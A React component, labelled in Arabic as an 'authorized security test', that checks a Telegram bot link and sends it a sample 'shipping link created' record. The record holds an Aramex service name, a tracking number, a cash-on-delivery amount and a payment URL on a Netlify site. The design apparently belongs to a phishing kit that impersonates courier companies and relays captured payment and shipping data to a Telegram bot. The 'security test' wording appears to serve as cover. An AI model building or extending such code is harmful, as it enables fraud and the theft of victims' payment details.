import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { testTelegramConnection, sendToTelegram } from '@/lib/telegram';
import { CheckCircle, XCircle, Send, Bot } from 'lucide-react';

const TelegramTest = () => {
  const [isTesting, setIsTesting] = useState(false);
  const [testResult, setTestResult] = useState<{
    success: boolean;
    messageId?: string;
    error?: string;
  } | null>(null);

  const handleTestConnection = async () => {
    setIsTesting(true);
    setTestResult(null);
    
    try {
      const result = await testTelegramConnection();
      setTestResult(result);
    } catch (error) {
      setTestResult({
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
    } finally {
      setIsTesting(false);
    }
  };

  const handleSendTestData = async () => {
    setIsTesting(true);
    setTestResult(null);
    
    try {
      const result = await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: 'CYBERSEC_TEST_123456',
          service_name: 'أرامكس - Aramex (اختبار أمني)',
          package_weight: '2.5',
          package_description: 'اختبار أمني - ملابس واكسسوارات',
          cod_amount: 150,
          country: 'المملكة العربية السعودية',
          payment_url: 'https://gulf-unified-platform.netlify.app/r/SA/shipping/test123?service=aramex'
        },
        timestamp: new Date().toISOString()
      });
      
      setTestResult(result);
    } catch (error) {
      setTestResult({
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
    } finally {
      setIsTesting(false);
    }
  };

  return (
    <Card className="p-6 max-w-2xl mx-auto">
      <div className="flex items-center gap-3 mb-6">
        <Bot className="w-8 h-8 text-blue-500" />
        <div>
          <h2 className="text-2xl font-bold">🔒 اختبار أمني - بوت التليجرام</h2>
          <p className="text-muted-foreground">اختبار أمني مرخص - تأكد من وصول البيانات إلى البوت</p>
        </div>
      </div>

      <div className="space-y-4">
        <div className="flex gap-3">
          <Button
            onClick={handleTestConnection}
            disabled={isTesting}
            className="flex-1"
          >
            {isTesting ? (
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>جاري الاختبار...</span>
              </div>
            ) : (
              <div className="flex items-center gap-2">
                <Send className="w-4 h-4" />
                <span>اختبار الاتصال</span>
              </div>
            )}
          </Button>

          <Button
            onClick={handleSendTestData}
            disabled={isTesting}
            variant="outline"
            className="flex-1"
          >
            <div className="flex items-center gap-2">
              <Send className="w-4 h-4" />
              <span>إرسال بيانات تجريبية</span>
            </div>
          </Button>
        </div>

        {testResult && (
          <div className="mt-4">
            <div className="flex items-center gap-2 mb-2">
              {testResult.success ? (
                <CheckCircle className="w-5 h-5 text-green-500" />
              ) : (
                <XCircle className="w-5 h-5 text-red-500" />
              )}
              <span className="font-semibold">
                {testResult.success ? 'تم الإرسال بنجاح!' : 'فشل في الإرسال'}
              </span>
            </div>

            {testResult.success ? (
              <div className="space-y-2">
                <Badge variant="secondary" className="text-green-600">
                  ✅ تم إرسال الرسالة إلى التليجرام
                </Badge>
                {testResult.messageId && (
                  <p className="text-sm text-muted-foreground">
                    معرف الرسالة: {testResult.messageId}
                  </p>
                )}
                <p className="text-sm text-green-600">
                  تحقق من بوت التليجرام للتأكد من وصول الرسالة
                </p>
              </div>
            ) : (
              <div className="space-y-2">
                <Badge variant="destructive">
                  ❌ خطأ في الإرسال
                </Badge>
                <p className="text-sm text-red-600">
                  {testResult.error}
                </p>
              </div>
            )}
          </div>
        )}

        <div className="mt-6 p-4 bg-muted rounded-lg">
          <h3 className="font-semibold mb-2">معلومات البوت:</h3>
          <div className="text-sm space-y-1">
            <p><strong>معرف البوت:</strong> 8208871147</p>
            <p><strong>الرابط:</strong> <a href="https://t.me/8208871147" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:underline">@8208871147</a></p>
            <p><strong>الحالة:</strong> {testResult?.success ? 'متصل' : 'غير محدد'}</p>
          </div>
        </div>
      </div>
    </Card>
  );
};

export default TelegramTest;